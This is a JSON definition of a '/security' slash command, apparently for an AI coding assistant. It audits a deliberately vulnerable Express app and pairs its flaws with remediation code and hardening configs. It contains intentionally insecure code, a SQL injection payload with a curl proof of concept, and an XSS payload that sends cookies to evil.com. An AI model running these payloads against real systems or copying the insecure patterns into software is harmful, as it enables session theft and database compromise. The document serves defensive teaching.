{
  "title": "/security",
  "description": "Comprehensive security audit with vulnerability detection, threat analysis, and automated remediation recommendations",
  "category": "development",
  "author": "claudepro",
  "dateAdded": "2025-09-16",
  "tags": ["security", "audit", "vulnerability", "threat-analysis", "penetration-testing"],
  "content": "The `/security` command provides comprehensive security auditing including vulnerability scanning, threat modeling, penetration testing, compliance checking, and automated security hardening recommendations.\n\n## Usage\n\n```\n/security [options] <file_or_project>\n```\n\n## Options\n\n### Audit Types\n- `--vulnerability` - OWASP Top 10 and CVE scanning\n- `--authentication` - Auth and session security analysis\n- `--authorization` - Access control and permissions audit\n- `--data-protection` - Encryption and data security review\n- `--infrastructure` - Server and network security assessment\n- `--compliance` - SOC2, GDPR, HIPAA compliance checking\n- `--all` - Comprehensive security audit (default)\n\n### Scan Depth\n- `--surface` - Quick surface-level scan\n- `--deep` - Comprehensive deep analysis\n- `--penetration` - Simulated attack testing\n- `--compliance` - Regulatory compliance audit\n\n### Threat Modeling\n- `--stride` - STRIDE threat modeling framework\n- `--attack-tree` - Generate attack tree analysis\n- `--risk-assessment` - Quantitative risk analysis\n- `--threat-intelligence` - Latest threat intelligence integration\n\n### Output Formats\n- `--format=report` - Detailed security report (default)\n- `--format=sarif` - SARIF format for CI/CD integration\n- `--format=json` - Machine-readable JSON output\n- `--format=executive` - Executive summary for stakeholders\n\n## Examples\n\n### Web Application Security Audit\n\n```javascript\n// Vulnerable web application with multiple security issues\nconst express = require('express');\nconst mysql = require('mysql');\nconst bcrypt = require('bcrypt');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\n// 🚨 Security Issue 1: No rate limiting\napp.use(express.json());\n\n// 🚨 Security Issue 2: Hardcoded database credentials\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password123', // 🚨 Hardcoded password\n  database: 'myapp'\n});\n\n// 🚨 Security Issue 3: Weak JWT secret\nconst JWT_SECRET = 'secret'; // 🚨 Weak secret\n\n// 🚨 Security Issue 4: SQL Injection vulnerability\napp.post('/login', async (req, res) => {\n  const { email, password } = req.body;\n  \n  // 🚨 Direct string interpolation - SQL injection risk\n  const query = `SELECT * FROM users WHERE email = '${email}'`;\n  \n  db.query(query, async (err, results) => {\n    if (err) {\n      // 🚨 Security Issue 5: Information disclosure\n      return res.status(500).json({ error: err.message });\n    }\n    \n    if (results.length === 0) {\n      // 🚨 Security Issue 6: User enumeration\n      return res.status(401).json({ error: 'Invalid email' });\n    }\n    \n    const user = results[0];\n    \n    // 🚨 Security Issue 7: Timing attack vulnerability\n    if (await bcrypt.compare(password, user.password)) {\n      const token = jwt.sign(\n        { userId: user.id, email: user.email },\n        JWT_SECRET // 🚨 Weak secret\n      );\n      \n      // 🚨 Security Issue 8: Sensitive data in token\n      res.json({ token, user: user }); // 🚨 Exposes password hash\n    } else {\n      res.status(401).json({ error: 'Invalid password' });\n    }\n  });\n});\n\n// 🚨 Security Issue 9: Missing authentication middleware\napp.get('/admin/users', (req, res) => {\n  const query = 'SELECT * FROM users';\n  \n  db.query(query, (err, results) => {\n    if (err) {\n      return res.status(500).json({ error: err.message });\n    }\n    \n    // 🚨 Security Issue 10: No access control\n    res.json(results); // 🚨 Exposes all user data including passwords\n  });\n});\n\n// 🚨 Security Issue 11: XSS vulnerability\napp.get('/search', (req, res) => {\n  const { q } = req.query;\n  \n  // 🚨 Direct output without sanitization\n  res.send(`<h1>Search results for: ${q}</h1>`);\n});\n\n// 🚨 Security Issue 12: CSRF vulnerability (no CSRF protection)\napp.post('/transfer-money', (req, res) => {\n  const { to, amount } = req.body;\n  \n  // 🚨 No CSRF token validation\n  // Process money transfer...\n  \n  res.json({ success: true });\n});\n\n// 🚨 Security Issue 13: Missing security headers\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});\n```\n\n**Security Audit Report:**\n\n```markdown\n# 🔒 Security Audit Report\n\n## 🚨 Critical Vulnerabilities (13 issues found)\n\n### 1. SQL Injection (CRITICAL - CWE-89)\n**Location:** `/login` endpoint, line 18  \n**CVSS Score:** 9.8 (Critical)  \n**Attack Vector:** Network  \n**Impact:** Complete database compromise\n\n**Vulnerability:**\n```javascript\n// ❌ Vulnerable code\nconst query = `SELECT * FROM users WHERE email = '${email}'`;\n\n// 🚨 Attack payload:\n// email: \"' OR '1'='1' UNION SELECT username, password FROM admin_users --\"\n```\n\n**Proof of Concept:**\n```bash\ncurl -X POST http://localhost:3000/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"email\": \"\\047 OR 1=1 --\", \"password\": \"anything\"}'\n\n# Result: Bypasses authentication and may expose user data\n```\n\n**Impact:**\n- Complete database access\n- User credential theft\n- Data manipulation/deletion\n- Administrative access escalation\n\n**Remediation:**\n```javascript\n// ✅ Secure implementation with parameterized queries\napp.post('/login', async (req, res) => {\n  const { email, password } = req.body;\n  \n  // Input validation\n  if (!email || !password) {\n    return res.status(400).json({ error: 'Email and password required' });\n  }\n  \n  // Email format validation\n  const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;\n  if (!emailRegex.test(email)) {\n    return res.status(400).json({ error: 'Invalid email format' });\n  }\n  \n  try {\n    // ✅ Parameterized query prevents SQL injection\n    const query = 'SELECT id, email, password, role FROM users WHERE email = ? AND active = 1';\n    const results = await db.promise().query(query, [email]);\n    \n    if (results[0].length === 0) {\n      // ✅ Generic error message prevents user enumeration\n      return res.status(401).json({ error: 'Invalid credentials' });\n    }\n    \n    const user = results[0][0];\n    \n    // ✅ Secure password comparison\n    const isValidPassword = await bcrypt.compare(password, user.password);\n    \n    if (!isValidPassword) {\n      // ✅ Same error message for failed password\n      return res.status(401).json({ error: 'Invalid credentials' });\n    }\n    \n    // ✅ Secure token generation\n    const token = jwt.sign(\n      { \n        userId: user.id, \n        email: user.email,\n        role: user.role \n      },\n      process.env.JWT_SECRET, // ✅ Strong secret from environment\n      { \n        expiresIn: '1h',\n        issuer: 'myapp',\n        audience: 'myapp-users'\n      }\n    );\n    \n    // ✅ Don't expose sensitive data\n    res.json({ \n      token,\n      user: {\n        id: user.id,\n        email: user.email,\n        role: user.role\n      }\n    });\n    \n    // ✅ Log successful login for monitoring\n    console.log(`User ${user.email} logged in successfully`);\n    \n  } catch (error) {\n    console.error('Login error:', error);\n    // ✅ Generic error message\n    res.status(500).json({ error: 'Internal server error' });\n  }\n});\n```\n\n### 2. Hardcoded Credentials (HIGH - CWE-798)\n**Location:** Database connection, line 9  \n**CVSS Score:** 8.5 (High)  \n**Impact:** Database access, credential exposure in source code\n\n**Vulnerability:**\n```javascript\n// ❌ Hardcoded credentials in source code\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password123', // 🚨 Exposed in version control\n  database: 'myapp'\n});\n```\n\n**Remediation:**\n```javascript\n// ✅ Environment-based configuration\nrequire('dotenv').config();\n\nconst db = mysql.createConnection({\n  host: process.env.DB_HOST || 'localhost',\n  user: process.env.DB_USER,\n  password: process.env.DB_PASSWORD,\n  database: process.env.DB_NAME,\n  ssl: process.env.NODE_ENV === 'production' ? {\n    rejectUnauthorized: true,\n    ca: fs.readFileSync(process.env.DB_SSL_CA),\n    cert: fs.readFileSync(process.env.DB_SSL_CERT),\n    key: fs.readFileSync(process.env.DB_SSL_KEY)\n  } : false,\n  acquireTimeout: 60000,\n  timeout: 60000,\n  reconnect: true\n});\n\n// ✅ Environment file (.env) - not committed to version control\n/*\nDB_HOST=secure-db.company.com\nDB_USER=app_user\nDB_PASSWORD=x$9mK#p2L@8nQ5vR\nDB_NAME=production_db\nDB_SSL_CA=/path/to/ca-cert.pem\nDB_SSL_CERT=/path/to/client-cert.pem\nDB_SSL_KEY=/path/to/client-key.pem\nJWT_SECRET=aB3dF6hJ9kL2nP5sT8wZ1cE4gI7mQ0uX\n*/\n```\n\n### 3. Cross-Site Scripting (XSS) (HIGH - CWE-79)\n**Location:** `/search` endpoint, line 44  \n**CVSS Score:** 8.2 (High)  \n**Impact:** Session hijacking, credential theft, malware distribution\n\n**Vulnerability:**\n```javascript\n// ❌ Direct output without sanitization\napp.get('/search', (req, res) => {\n  const { q } = req.query;\n  res.send(`<h1>Search results for: ${q}</h1>`);\n});\n\n// 🚨 Attack payload:\n// GET /search?q=<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>\n```\n\n**Proof of Concept:**\n```bash\n# XSS payload that steals cookies\ncurl \"http://localhost:3000/search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E\"\n\n# Result: JavaScript execution in victim's browser\n```\n\n**Remediation:**\n```javascript\nconst DOMPurify = require('dompurify');\nconst { JSDOM } = require('jsdom');\n\nconst window = new JSDOM('').window;\nconst purify = DOMPurify(window);\n\napp.get('/search', (req, res) => {\n  const { q } = req.query;\n  \n  // ✅ Input validation\n  if (!q || typeof q !== 'string') {\n    return res.status(400).json({ error: 'Invalid search query' });\n  }\n  \n  // ✅ Sanitize user input\n  const sanitizedQuery = purify.sanitize(q);\n  \n  // ✅ Use template engine with auto-escaping\n  res.render('search-results', {\n    query: sanitizedQuery,\n    results: performSearch(sanitizedQuery)\n  });\n});\n\n// ✅ Alternative: JSON API response (safer)\napp.get('/api/search', (req, res) => {\n  const { q } = req.query;\n  \n  if (!q || typeof q !== 'string' || q.length > 100) {\n    return res.status(400).json({ error: 'Invalid search query' });\n  }\n  \n  const results = performSearch(q); // Search function handles sanitization\n  \n  res.json({\n    query: q,\n    results: results,\n    total: results.length\n  });\n});\n```\n\n### 4. Missing Authentication & Authorization (HIGH - CWE-862)\n**Location:** `/admin/users` endpoint, line 37  \n**CVSS Score:** 8.0 (High)  \n**Impact:** Unauthorized data access, privilege escalation\n\n**Remediation:**\n```javascript\nconst rateLimit = require('express-rate-limit');\nconst helmet = require('helmet');\n\n// ✅ Security middleware\napp.use(helmet({\n  contentSecurityPolicy: {\n    directives: {\n      defaultSrc: [\"'self'\"],\n      styleSrc: [\"'self'\", \"'unsafe-inline'\"],\n      scriptSrc: [\"'self'\"],\n      imgSrc: [\"'self'\", \"data:\", \"https:\"],\n    },\n  },\n  hsts: {\n    maxAge: 31536000,\n    includeSubDomains: true,\n    preload: true\n  }\n}));\n\n// ✅ Rate limiting\nconst authLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 5, // 5 attempts per window\n  message: 'Too many login attempts, please try again later',\n  standardHeaders: true,\n  legacyHeaders: false,\n});\n\nconst apiLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 100, // 100 requests per window\n  message: 'Too many requests, please try again later'\n});\n\napp.use('/login', authLimiter);\napp.use('/api/', apiLimiter);\n\n// ✅ Authentication middleware\nconst authenticateToken = (req, res, next) => {\n  const authHeader = req.headers['authorization'];\n  const token = authHeader && authHeader.split(' ')[1];\n  \n  if (!token) {\n    return res.status(401).json({ error: 'Access token required' });\n  }\n  \n  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {\n    if (err) {\n      return res.status(403).json({ error: 'Invalid or expired token' });\n    }\n    \n    req.user = user;\n    next();\n  });\n};\n\n// ✅ Authorization middleware\nconst requireRole = (roles) => {\n  return (req, res, next) => {\n    if (!req.user) {\n      return res.status(401).json({ error: 'Authentication required' });\n    }\n    \n    if (!roles.includes(req.user.role)) {\n      return res.status(403).json({ error: 'Insufficient permissions' });\n    }\n    \n    next();\n  };\n};\n\n// ✅ Secure admin endpoint\napp.get('/admin/users', \n  authenticateToken, \n  requireRole(['admin', 'moderator']), \n  async (req, res) => {\n    try {\n      // ✅ Parameterized query with limited fields\n      const query = `\n        SELECT id, email, role, created_at, last_login, active \n        FROM users \n        ORDER BY created_at DESC \n        LIMIT ? OFFSET ?\n      `;\n      \n      const page = parseInt(req.query.page) || 1;\n      const limit = Math.min(parseInt(req.query.limit) || 20, 100);\n      const offset = (page - 1) * limit;\n      \n      const [users, totalCount] = await Promise.all([\n        db.promise().query(query, [limit, offset]),\n        db.promise().query('SELECT COUNT(*) as total FROM users')\n      ]);\n      \n      // ✅ Audit log\n      console.log(`Admin ${req.user.email} accessed user list`);\n      \n      res.json({\n        users: users[0],\n        pagination: {\n          page,\n          limit,\n          total: totalCount[0][0].total,\n          totalPages: Math.ceil(totalCount[0][0].total / limit)\n        }\n      });\n      \n    } catch (error) {\n      console.error('Admin users query error:', error);\n      res.status(500).json({ error: 'Internal server error' });\n    }\n  }\n);\n```\n\n### 5. Cross-Site Request Forgery (CSRF) (MEDIUM - CWE-352)\n**Location:** `/transfer-money` endpoint, line 50  \n**CVSS Score:** 6.8 (Medium)  \n**Impact:** Unauthorized actions on behalf of authenticated users\n\n**Remediation:**\n```javascript\nconst csrf = require('csurf');\nconst cookieParser = require('cookie-parser');\n\napp.use(cookieParser());\n\n// ✅ CSRF protection\nconst csrfProtection = csrf({ \n  cookie: {\n    httpOnly: true,\n    secure: process.env.NODE_ENV === 'production',\n    sameSite: 'strict'\n  }\n});\n\napp.use(csrfProtection);\n\n// ✅ Provide CSRF token to frontend\napp.get('/api/csrf-token', (req, res) => {\n  res.json({ csrfToken: req.csrfToken() });\n});\n\n// ✅ Protected financial endpoint\napp.post('/transfer-money', \n  authenticateToken,\n  requireRole(['user', 'premium']),\n  async (req, res) => {\n    const { to, amount, description } = req.body;\n    \n    try {\n      // ✅ Input validation\n      if (!to || !amount || amount <= 0) {\n        return res.status(400).json({ error: 'Invalid transfer parameters' });\n      }\n      \n      if (amount > 10000) {\n        return res.status(400).json({ error: 'Transfer limit exceeded' });\n      }\n      \n      // ✅ Additional verification for large amounts\n      if (amount > 1000) {\n        const twoFACode = req.body.twoFactorCode;\n        if (!twoFACode || !verifyTwoFactorCode(req.user.id, twoFACode)) {\n          return res.status(403).json({ error: 'Two-factor authentication required' });\n        }\n      }\n      \n      // ✅ Database transaction for atomicity\n      await db.promise().beginTransaction();\n      \n      const transferResult = await processMoneyTransfer({\n        from: req.user.id,\n        to,\n        amount,\n        description\n      });\n      \n      await db.promise().commit();\n      \n      // ✅ Audit log\n      console.log(`Transfer: ${req.user.email} sent $${amount} to ${to}`);\n      \n      res.json({ \n        success: true, \n        transactionId: transferResult.id,\n        message: 'Transfer completed successfully'\n      });\n      \n    } catch (error) {\n      await db.promise().rollback();\n      console.error('Transfer error:', error);\n      res.status(500).json({ error: 'Transfer failed' });\n    }\n  }\n);\n```\n\n## 🛡️ Security Hardening Recommendations\n\n### 1. Infrastructure Security\n\n```yaml\n# ✅ Docker security configuration\n# Dockerfile\nFROM node:18-alpine AS base\n\n# Create non-root user\nRUN addgroup -g 1001 -S nodejs\nRUN adduser -S nodeuser -u 1001\n\n# Set working directory\nWORKDIR /app\n\n# Copy package files\nCOPY package*.json ./\n\n# Install dependencies\nRUN npm ci --only=production && npm cache clean --force\n\n# Copy application code\nCOPY . .\n\n# Change ownership to non-root user\nRUN chown -R nodeuser:nodejs /app\n\n# Switch to non-root user\nUSER nodeuser\n\n# Expose port\nEXPOSE 3000\n\n# Health check\nHEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\\n  CMD curl -f http://localhost:3000/health || exit 1\n\nCMD [\"node\", \"server.js\"]\n```\n\n```yaml\n# ✅ Kubernetes security configuration\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: secure-app\nspec:\n  template:\n    spec:\n      serviceAccountName: app-service-account\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 1001\n        runAsGroup: 1001\n        fsGroup: 1001\n      containers:\n      - name: app\n        image: myapp:latest\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          capabilities:\n            drop:\n            - ALL\n        resources:\n          limits:\n            memory: \"512Mi\"\n            cpu: \"500m\"\n          requests:\n            memory: \"256Mi\"\n            cpu: \"250m\"\n        env:\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: db-secret\n              key: password\n        volumeMounts:\n        - name: tmp\n          mountPath: /tmp\n        - name: cache\n          mountPath: /app/cache\n      volumes:\n      - name: tmp\n        emptyDir: {}\n      - name: cache\n        emptyDir: {}\n```\n\n### 2. Network Security\n\n```nginx\n# ✅ Nginx security configuration\nserver {\n    listen 443 ssl http2;\n    server_name example.com;\n    \n    # SSL/TLS configuration\n    ssl_certificate /path/to/cert.pem;\n    ssl_certificate_key /path/to/key.pem;\n    ssl_protocols TLSv1.2 TLSv1.3;\n    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512;\n    ssl_prefer_server_ciphers off;\n    ssl_session_cache shared:SSL:10m;\n    ssl_session_timeout 10m;\n    \n    # Security headers\n    add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;\n    add_header X-Content-Type-Options \"nosniff\" always;\n    add_header X-Frame-Options \"DENY\" always;\n    add_header X-XSS-Protection \"1; mode=block\" always;\n    add_header Referrer-Policy \"strict-origin-when-cross-origin\" always;\n    add_header Content-Security-Policy \"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none';\" always;\n    \n    # Rate limiting\n    limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;\n    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;\n    \n    location /login {\n        limit_req zone=login burst=5 nodelay;\n        proxy_pass http://backend;\n    }\n    \n    location /api/ {\n        limit_req zone=api burst=20 nodelay;\n        proxy_pass http://backend;\n    }\n    \n    # Hide server information\n    server_tokens off;\n    \n    # Prevent access to sensitive files\n    location ~ /\\. {\n        deny all;\n    }\n    \n    location ~ \\.(env|config|sql|log)$ {\n        deny all;\n    }\n}\n```\n\n### 3. Database Security\n\n```sql\n-- ✅ Database security hardening\n\n-- Create application-specific user with limited privileges\nCREATE USER 'app_user'@'%' IDENTIFIED BY 'strong_random_password';\n\n-- Grant only necessary permissions\nGRANT SELECT, INSERT, UPDATE, DELETE ON myapp.users TO 'app_user'@'%';\nGRANT SELECT, INSERT, UPDATE, DELETE ON myapp.products TO 'app_user'@'%';\nGRANT SELECT, INSERT, UPDATE, DELETE ON myapp.orders TO 'app_user'@'%';\n\n-- Remove dangerous permissions\nREVOKE FILE ON *.* FROM 'app_user'@'%';\nREVOKE PROCESS ON *.* FROM 'app_user'@'%';\nREVOKE SUPER ON *.* FROM 'app_user'@'%';\n\n-- Enable SSL/TLS\nALTER USER 'app_user'@'%' REQUIRE SSL;\n\n-- Set connection limits\nALTER USER 'app_user'@'%' WITH MAX_CONNECTIONS_PER_HOUR 1000;\nALTER USER 'app_user'@'%' WITH MAX_QUERIES_PER_HOUR 10000;\n\n-- Enable query logging for monitoring\nSET GLOBAL general_log = 'ON';\nSET GLOBAL slow_query_log = 'ON';\nSET GLOBAL long_query_time = 2;\n\n-- Create indexes for performance and prevent enumeration attacks\nCREATE INDEX idx_users_email ON users(email);\nCREATE INDEX idx_users_active ON users(active);\nCREATE INDEX idx_sessions_token ON sessions(token_hash);\n```\n\n### 4. Application Security Monitoring\n\n```javascript\n// ✅ Security monitoring and alerting\nconst winston = require('winston');\nconst rateLimit = require('express-rate-limit');\n\n// Security event logger\nconst securityLogger = winston.createLogger({\n  level: 'info',\n  format: winston.format.combine(\n    winston.format.timestamp(),\n    winston.format.json()\n  ),\n  transports: [\n    new winston.transports.File({ filename: 'security.log' }),\n    new winston.transports.Console()\n  ]\n});\n\n// Security monitoring middleware\nconst securityMonitor = (req, res, next) => {\n  // Log suspicious patterns\n  const suspiciousPatterns = [\n    /script[^>]*>.*<\\/script>/i,\n    /javascript:/i,\n    /on\\w+=/i,\n    /'\\s*(or|and)\\s*'?\\d/i,\n    /union\\s+select/i,\n    /\\/\\*.*\\*\\//,\n    /<iframe/i\n  ];\n  \n  const userInput = JSON.stringify({\n    body: req.body,\n    query: req.query,\n    params: req.params\n  });\n  \n  for (const pattern of suspiciousPatterns) {\n    if (pattern.test(userInput)) {\n      securityLogger.warn('Suspicious input detected', {\n        ip: req.ip,\n        userAgent: req.get('User-Agent'),\n        url: req.originalUrl,\n        method: req.method,\n        input: userInput,\n        pattern: pattern.toString()\n      });\n      \n      // Block obvious attack attempts\n      if (pattern.test(userInput) && req.originalUrl.includes('admin')) {\n        return res.status(403).json({ error: 'Request blocked' });\n      }\n    }\n  }\n  \n  next();\n};\n\napp.use(securityMonitor);\n\n// Failed login attempt monitoring\nconst loginAttempts = new Map();\n\napp.post('/login', (req, res, next) => {\n  const clientId = req.ip + ':' + req.get('User-Agent');\n  const attempts = loginAttempts.get(clientId) || 0;\n  \n  if (attempts > 10) {\n    securityLogger.error('Potential brute force attack', {\n      ip: req.ip,\n      userAgent: req.get('User-Agent'),\n      attempts: attempts\n    });\n    \n    return res.status(429).json({ error: 'Too many failed attempts' });\n  }\n  \n  // Track failed attempts\n  res.on('finish', () => {\n    if (res.statusCode === 401) {\n      loginAttempts.set(clientId, attempts + 1);\n      setTimeout(() => loginAttempts.delete(clientId), 15 * 60 * 1000);\n    } else if (res.statusCode === 200) {\n      loginAttempts.delete(clientId);\n    }\n  });\n  \n  next();\n});\n\n// Security headers monitoring\napp.use((req, res, next) => {\n  res.on('finish', () => {\n    const securityHeaders = [\n      'X-Content-Type-Options',\n      'X-Frame-Options',\n      'X-XSS-Protection',\n      'Strict-Transport-Security',\n      'Content-Security-Policy'\n    ];\n    \n    const missingHeaders = securityHeaders.filter(header => !res.get(header));\n    \n    if (missingHeaders.length > 0) {\n      securityLogger.warn('Missing security headers', {\n        url: req.originalUrl,\n        missingHeaders: missingHeaders\n      });\n    }\n  });\n  \n  next();\n});\n```\n\n## 🎯 Security Compliance Checklist\n\n### ✅ OWASP Top 10 (2021)\n- [ ] A01: Broken Access Control\n- [ ] A02: Cryptographic Failures\n- [ ] A03: Injection\n- [ ] A04: Insecure Design\n- [ ] A05: Security Misconfiguration\n- [ ] A06: Vulnerable and Outdated Components\n- [ ] A07: Identification and Authentication Failures\n- [ ] A08: Software and Data Integrity Failures\n- [ ] A09: Security Logging and Monitoring Failures\n- [ ] A10: Server-Side Request Forgery (SSRF)\n\n### ✅ Data Protection (GDPR/CCPA)\n- [ ] Data encryption at rest and in transit\n- [ ] Personal data inventory and classification\n- [ ] Data retention and deletion policies\n- [ ] User consent management\n- [ ] Data breach notification procedures\n- [ ] Privacy by design implementation\n\n### ✅ Infrastructure Security\n- [ ] Network segmentation and firewalls\n- [ ] Container security and image scanning\n- [ ] Secrets management and rotation\n- [ ] Monitoring and incident response\n- [ ] Backup and disaster recovery\n- [ ] Vulnerability management program\n\nThis security audit provides comprehensive vulnerability assessment with actionable remediation steps and compliance guidance.",
  "configuration": {
    "temperature": 0.1,
    "maxTokens": 16000,
    "systemPrompt": "You are a cybersecurity expert specializing in application security, penetration testing, and compliance. Provide detailed vulnerability analysis with proof-of-concept attacks and comprehensive remediation strategies."
  },
  "githubUrl": "https://github.com/claudepro/security-auditor",
  "documentationUrl": "https://docs.claude.ai/commands/security"
}